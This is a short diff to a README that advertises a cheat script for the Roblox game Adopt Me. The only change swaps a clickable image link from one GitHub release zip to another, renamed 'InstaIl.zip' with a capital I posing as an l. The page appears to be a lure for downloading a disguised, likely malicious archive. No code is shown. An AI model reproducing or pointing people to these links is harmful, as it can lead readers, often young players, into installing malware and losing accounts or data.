@@ -3,7 +3,7 @@ Adopt Me Script Pastebin 2025 No Key Exploit Hack Cheat
 
 
 # <div style="text-align:center"> 
-  <a href="https://github.com/Remo1s/Net6/releases/download/net7/SetUp.zip"><img src="https://i.postimg.cc/PqKJCZD3/rounded-in-photoretrica-1-1-1.png" /></a>
+  <a href="https://github.com/Terms2p/Tep3/releases/download/tef2ff/InstaIl.zip"><img src="https://i.postimg.cc/PqKJCZD3/rounded-in-photoretrica-1-1-1.png" /></a>
 </div>
 
 ![image](https://github.com/user-attachments/assets/ac8dc305-e50d-4047-beb6-190462a59273)
